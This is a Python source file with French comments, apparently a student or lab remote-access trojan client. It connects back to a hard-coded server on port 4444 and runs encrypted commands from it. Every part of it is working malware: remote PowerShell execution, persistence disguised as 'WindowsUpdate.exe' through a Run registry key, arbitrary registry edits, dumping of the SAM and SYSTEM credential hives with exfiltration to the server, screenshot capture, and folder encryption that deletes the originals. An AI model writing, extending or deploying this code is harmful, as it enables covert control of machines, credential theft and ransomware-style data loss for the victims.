import socket
import subprocess
import os
import sys
import base64
import time
import shutil
import winreg
import mss
from cryptography.fernet import Fernet


SERVER_IP = "192.168.85.133"
SERVER_PORT = 4444
BUFFER = 4096

# on charge la meme clef que le serveur
try:
    with open("secret.key", "rb") as key_file:
        KEY = key_file.read()
    cipher = Fernet(KEY)
except FileNotFoundError:
    print("[-] Fichier secret.key introuvable")
    sys.exit(1)


# recupere la vraie ip de la machine, pas 127.0.0.1
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"


def main():
    print(f"[*] Client demarre - IP: {get_ip()}")

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")

            # le handshake reste en clair pour que le serveur lise l'info
            sock.send(f"{socket.gethostname()} - {get_ip()}".encode())

            while True:
                try:
                    data_recue = sock.recv(BUFFER)
                    if not data_recue:
                        break

                    # exit est envoye en clair par le serveur
                    if data_recue == b"exit":
                        sock.close()
                        return

                    # on dechiffre la commande recue
                    try:
                        commande = cipher.decrypt(data_recue).decode("utf-8").strip()
                    except Exception:
                        commande = data_recue.decode("utf-8").strip()

                    if commande == "persistance":
                        resultat = setup_persistence()
                        sock.send(cipher.encrypt(resultat.encode()))

                    elif commande.startswith("regedit "):
                        parts = commande.split(" ", 3)
                        if len(parts) == 4:
                            resultat = add_registry_key(parts[1], parts[2], parts[3])
                        else:
                            resultat = "Usage: regedit CHEMIN NOM VALEUR"
                        sock.send(cipher.encrypt(resultat.encode()))

                    elif commande == "sam":
                        resultat = dump_sam()
                        sock.sendall(resultat.encode())

                    elif commande == "screenshot":
                        data = take_screenshot()
                        sock.sendall(data)

                    elif commande.startswith("encrypt "):
                        chemin = commande.split(" ", 1)[1]
                        resultat = encrypt_folder(chemin)
                        sock.send(cipher.encrypt(resultat.encode()))

                    else:
                        resultat = execute_cmd(commande)
                        sock.send(cipher.encrypt(resultat.encode()))

                except Exception as e:
                    print(f"[!] Erreur: {e}")
                    try:
                        sock.send(cipher.encrypt(f"Erreur: {e}".encode()))
                    except:
                        break

        except:
            try:
                sock.close()
            except:
                pass
            print("[*] Reconnexion dans 5s...")
            time.sleep(5)


# se copie dans appdata et s'ajoute au demarrage de windows
def setup_persistence():
    try:
        dest = os.path.join(os.environ["APPDATA"], "WindowsUpdate.exe")
        if not os.path.exists(dest):
            shutil.copy2(sys.argv[0], dest)

        clef = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(clef, "WindowsUpdate", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(clef)
        return "Persistance activee"
    except Exception as e:
        return f"Erreur persistance: {e}"


# ajoute une clef dans le registre windows
def add_registry_key(chemin, nom, valeur):
    try:
        clef = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chemin, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(clef, nom, 0, winreg.REG_SZ, valeur)
        winreg.CloseKey(clef)
        return f"Clef ajoutee: {chemin}\\{nom} = {valeur}"
    except Exception as e:
        return f"Erreur registre: {e}"


# recupere les fichiers SAM et SYSTEM (faut etre admin)
def dump_sam():
    try:
        subprocess.run(["reg", "save", "HKLM\\SAM", "sam.hive", "/y"],
                       capture_output=True, check=True)
        subprocess.run(["reg", "save", "HKLM\\SYSTEM", "system.hive", "/y"],
                       capture_output=True, check=True)

        with open("sam.hive", "rb") as f:
            sam = base64.b64encode(f.read()).decode()
        with open("system.hive", "rb") as f:
            system = base64.b64encode(f.read()).decode()

        os.remove("sam.hive")
        os.remove("system.hive")
        return f"SAM:{sam}\nSYSTEM:{system}"
    except Exception as e:
        for fic in ["sam.hive", "system.hive"]:
            if os.path.exists(fic):
                os.remove(fic)
        return f"Erreur SAM: {e}"


# prend un screenshot et renvoie les bytes png bruts
def take_screenshot():
    try:
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            return mss.tools.to_png(img.rgb, img.size)
    except Exception as e:
        return f"Erreur screenshot: {e}".encode()


# execute une commande powershell et renvoie la sortie
def execute_cmd(cmd):
    proc = subprocess.run(
        ["powershell.exe", "-Command", cmd],
        capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=30
    )
    output = proc.stdout + proc.stderr
    if not output.strip():
        output = "(pas de sortie)"
    return output


# chiffre tous les fichiers d'un dossier avec AES et renvoie la clef
def encrypt_folder(chemin):
    try:
        if not os.path.isdir(chemin):
            return f"Erreur: {chemin} n'est pas un dossier"

        clef = Fernet.generate_key()
        fernet = Fernet(clef)
        compteur = 0

        for racine, dossiers, fichiers in os.walk(chemin):
            for nom in fichiers:
                filepath = os.path.join(racine, nom)
                try:
                    with open(filepath, "rb") as f:
                        contenu = f.read()
                    chiffre = fernet.encrypt(contenu)
                    with open(filepath + ".enc", "wb") as f:
                        f.write(chiffre)
                    os.remove(filepath)
                    compteur += 1
                except:
                    pass

        return f"{compteur} fichiers chiffres dans {chemin}\nCLEF:{clef.decode()}"
    except Exception as e:
        return f"Erreur chiffrement: {e}"


if __name__ == "__main__":
    main()
